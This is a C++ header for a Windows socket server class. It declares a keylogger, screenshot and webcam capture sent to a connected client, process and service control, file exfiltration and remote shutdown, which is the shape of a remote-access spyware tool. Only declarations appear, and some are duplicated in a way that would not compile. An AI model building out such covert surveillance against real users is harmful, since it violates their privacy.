

// server_socket.h
#ifndef SERVER_SOCKET_H
#define SERVER_SOCKET_H


#include <winsock2.h>
#include <windows.h>
#include <winerror.h>
#include <string>
#include <iostream> 
#include <gdiplus.h>
#include <fstream>
#include <vector>
#include <cstdint>
#include <sstream>
#include <opencv2/opencv.hpp>
#include <ws2tcpip.h>
#include <thread>
#include <mutex>
#include <condition_variable>
#include <atomic>
#include <vector>
#include <cstdint>
#include <sstream>
#include <map> //using for keyLogger
#include <thread> //using for keyLogger
#include <mutex> //using for keyLogger
#include <tlhelp32.h> //using for list app
#include <ctime> //using for list app
#include <tchar.h> //using for open App / printServices
#include <iomanip> //using for file
#include <chrono> //using for file
#include <ctime> //using for file



// Ensure NO_ERROR is defined
#ifndef NO_ERROR
#define NO_ERROR 0
#endif

#pragma comment (lib,"gdiplus.lib")

using namespace Gdiplus;




class Server {
public:
    Server(int port);
    ~Server();
    bool start();
    void listenForConnections();
    void shutdownServer();
    void restartServer();
    void readKey(int, SOCKET);
    void keyLogger(SOCKET);


private:
    int port;
    SOCKET listenSocket; 
    ULONG_PTR gdiplusToken; // Add this member
    void handleClient(SOCKET clientSocket);
  
    void copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName);
    
    //shutdown and restart
    void shutdownServer();
    void restartServer();
    //keylogger
    bool isLogging = false;
    std::thread keyLoggerThread;
    std::mutex logMutex;
    void startKeyLogger();
    void stopKeyLogger(SOCKET);
    void keyLogger();
    //List/Turn on/Turn off App
    bool isBackgroundProcess(const wchar_t* processName);
    bool hasVisibleWindow(const int processID);
    void listApplications(SOCKET);
    void openProcess(const std::string& appName, SOCKET clientSocket);
    void closeProcess(const int processID, SOCKET clientSocket);
    //List/Turn on/Turn off services
    void listServices(SOCKET);
    bool captureScreenshot(cv::Mat& outImage);
    bool captureAndSendScreenshot(SOCKET clientSocket);
    void copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileName, const std::string& destinationFileName);
    void openWebcam(SOCKET clientSocket);
    void startRecording(cv::VideoCapture& webcam, SOCKET clientSocket);
    void stopRecording(SOCKET clientSocket);
};

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid);

#endif // SERVER_SOCKET_H
